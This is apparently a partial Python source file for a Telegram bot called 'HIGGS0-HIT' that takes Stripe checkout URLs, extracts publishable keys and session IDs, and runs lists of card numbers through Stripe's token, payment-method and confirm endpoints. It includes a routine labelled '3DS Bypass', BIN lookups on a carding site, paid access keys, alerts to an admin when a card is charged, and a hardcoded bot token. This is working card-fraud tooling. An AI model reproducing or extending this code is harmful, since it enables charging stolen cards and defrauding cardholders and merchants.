...
BOT_TOKEN  = "8647852751:AAEs4wptc9gyLeLYJdCxnTX-Wg_4yB-kvq8"   # ← paste your token
ADMIN_ID   = "8233015284"
...
def fmt_result(res: dict, session: Optional[CheckoutSession] = None) -> str:
    if res["status"] == "CHARGED" and session:
        ...
        site_line = session.merchant or "N/A"
        if session.support_url:
            site_line += f" ({session.support_url})"
        confirm_line = session.success_url or "N/A"
        return (
            f"<b>CC:</b> <code>{res['card']}</code>\n"
            f"<b>Status: Paid ✅</b>\n"
            f"<b>Message: {amount} Charged!</b>\n\n"
            f"<b>Site:</b> {site_line}\n"
            f"<b>ConfirmUrl:</b> {confirm_line}\n"
            f"<b>Amount:</b> {amount}\n\n"
...
def decode_pk_from_url(url: str) -> tuple[Optional[str], Optional[str]]:
    pk, cs = None, None
    cs_m = re.search(r"cs_(live|test)_[A-Za-z0-9]+", url)
    if cs_m:
        cs = cs_m.group(0)
    if "#" in url:
        try:
            hash_part = url.split("#")[1]
            buf = base64.b64decode(hash_part + "==")
...
async def lookup_bin(bin_num: str) -> dict:
    url = f"https://bins.antipublic.cc/bins/{bin_num[:8]}"
    try:
        ...
        pass
    return {"bin": bin_num[:6], "brand": "N/A", "type": "N/A", "level": "N/A",
...
async def init_checkout(raw_url: str):
    ...
    if not pk or not cs:
        return {"error": "Could not decode PK/CS from URL"}
    ...
    try:
        ...
        success_url = (
            ...
            (init_data.get("payment_intent") or {}).get("return_url")
        )
        email = (
        ...
        return CheckoutSession(
            ...
            email=email, url=url, success_url=success_url, support_url=support_url
        )
...
async def charge_card(cc_str: str, session: CheckoutSession) -> dict:
    ...
    email = (
        init_data.get("customer_email") or
        (init_data.get("customer") or {}).get("email") or
        "john@example.com"
    )
    ...
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
            ...
            tok_body = "&".join([
                ...
                f"card[name]={name}",
                f"card[address_country]={country}",
                f"card[address_line1]={line1}",
                f"card[address_city]={city}",
                f"card[address_state]={state}",
                f"card[address_zip]={zip_code}",
                f"key={pk}",
                "pasted_fields=number",
                "payment_user_agent=stripe.js/b3f6c00c8a; stripe-js-v3/b3f6c00c8a; checkout",
            ...
            tok_headers = {
                ...
                "user-agent": STRIPE_HEADERS["user-agent"],
            }
            async with s.post("https://api.stripe.com/v1/tokens", headers=tok_headers, data=tok_body) as r:
            ...
            async with s.post("https://api.stripe.com/v1/payment_methods", headers=STRIPE_HEADERS, data=pm_body) as r:
                pm = await r.json(content_type=None)
            ...
            async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=STRIPE_HEADERS, data=conf_body) as r:
            ...
            if "error" in conf:
                ...
                if st == "succeeded":
                    ...
                    bypass_body = "&".join([
                        ...
                        "use_stripe_sdk=true",
                        f"key={pk}",
                        f"client_secret={pi_cs}",
                    ])
                    async with s.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", headers=STRIPE_HEADERS, data=bypass_body) as r:
                        bypass = await r.json(content_type=None)

                    if "error" not in bypass:
                        b_st = bypass.get("status", "")
                        if b_st == "succeeded":
                            result["status"] = "CHARGED"
                            result["response"] = "3DS Bypassed - Payment Successful"
                        elif b_st == "requires_action":
                            na = bypass.get("next_action") or {}
                            redirect = na.get("redirect_to_url") or {}
                            r_url = redirect.get("url", "")
                            if r_url:
                                try:
                                    async with s.get(r_url, allow_redirects=True) as _:
                                        pass
                                    final_body = f"key={pk}&client_secret={pi_cs}"
                                    async with s.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}", headers=STRIPE_HEADERS, data=final_body) as r:
                                        final = await r.json(content_type=None)
...
async def send_charge_alert(app, triggered_by: dict, charged_card: str, tried_cards: list, session: CheckoutSession):
    ...
    msg = (
        ...
        f"<b>🔔 CHARGE ALERT</b>\n"
        f"{L}\n\n"
        f"{D} <b>MERCHANT</b> :: {site_line}\n"
        f"{D} <b>AMOUNT</b>   :: <code>{amount}</code>\n"
        f"{D} <b>USER</b>     :: <code>@{triggered_by.get('username') or 'N/A'}</code> (<code>{triggered_by['id']}</code>)\n\n"
        f"<b>✅ CHARGED CARD:</b>\n"
        f"  <code>{charged_card}</code>\n\n"
    ...
    try:
        ...
        print(f"[WARN] Failed to send charge alert: {e}")
...
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if admin:
        msg += (
            ...
            f"<code>/genkey</code>             {A} Generate 1 key\n"
            f"<code>/genkeys [n]</code>        {A} Generate n keys (max 20)\n"
...
async def cmd_usekey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    ensure_user(f.id, f.username, f.first_name)
    args = " ".join(ctx.args or "").strip().upper()
    if not args:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/usekey HGS-XXXXXXXXXXXXXXXXXXXX</code>", parse_mode=ParseMode.HTML)
        return
    k = keys.get(args)
    if not k:
        await update.message.reply_text(f"{L}\n<b>❌ INVALID KEY</b>\n{L}\n<code>KEY :: NOT FOUND</code>", parse_mode=ParseMode.HTML)
        return
    if k.is_used:
        await update.message.reply_text(f"{L}\n<b>❌ KEY EXHAUSTED</b>\n{L}\n<code>KEY :: ALREADY REDEEMED</code>", parse_mode=ParseMode.HTML)
        return
    tid = str(f.id)
    k.is_used = True
    k.assigned_to = tid
    k.used_at = time.time()
    users[tid].is_authorized = True
    users[tid].authorized_at = time.time()
    await update.message.reply_text(
        f"{L}\n<b>  ✅ ACCESS GRANTED</b>\n{L}\n\n"
        f"{D} <b>KEY</b>    :: <code>{args}</code>\n"
...
async def cmd_genkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    try:
        n = min(int(ctx.args[0]) if ctx.args else 5, 20)
    except ValueError:
        n = 5
    new_keys = []
    for _ in range(n):
...
async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    key_count = sum(1 for k in keys.values() if k.assigned_to == target)
    await update.message.reply_text(
        f"{L}\n<b>  🔍 USER PROFILE</b>\n{L}\n\n"
        ...
        f"{D} <b>KEYS USED</b> :: <code>{key_count}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )
...
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    authed  = sum(1 for u in all_users if u.is_authorized and not u.is_banned)
    banned  = sum(1 for u in all_users if u.is_banned)
    used_keys = sum(1 for k in all_keys if k.is_used)
    uptime = int(time.time() - _start_time)
    await update.message.reply_text(
        f"{L}\n<b>  📊 BOT STATISTICS</b>\n{L}\n\n"
        f"<b>[ USERS ]</b>\n"
        f"{D} <b>TOTAL</b>      :: <code>{len(all_users)}</code>\n"
        f"{D} <b>AUTHORIZED</b> :: <code>{authed}</code>\n"
        f"{D} <b>PENDING</b>    :: <code>{len(all_users) - authed - banned}</code>\n"
        f"{D} <b>BANNED</b>     :: <code>{banned}</code>\n\n"
        f"<b>[ KEYS ]</b>\n"
        f"{D} <b>TOTAL</b>    :: <code>{len(all_keys)}</code>\n"
        f"{D} <b>ACTIVE</b>   :: <code>{len(all_keys) - used_keys}</code>\n"
        f"{D} <b>REDEEMED</b> :: <code>{used_keys}</code>\n\n"
        f"<b>[ SYSTEM ]</b>\n"
...
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if not text:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/broadcast Your message here</code>", parse_mode=ParseMode.HTML); return
    sent = failed = 0
...
async def cmd_chk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if not session:
        await update.message.reply_text(
            f"{L}\n<b>⚠️ NO SESSION LOADED</b>\n{L}\n\n<i>Use /hit [url] to load a checkout first.</i>\n\n{L}",
            parse_mode=ParseMode.HTML
        ); return
...
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for i, line in enumerate(valid_lines):
        ...
        if res["status"] == "CHARGED":
            ...
            asyncio.create_task(send_charge_alert(
                ctx.application,
                {"id": update.effective_user.id, "username": update.effective_user.username},
                res["card"], tried_cards, session
            ))
            stopped     = True
            stop_reason = "charged"
            break
...
def main():
    ...
    print("HIGGS0-HIT v1.0 — starting polling...")
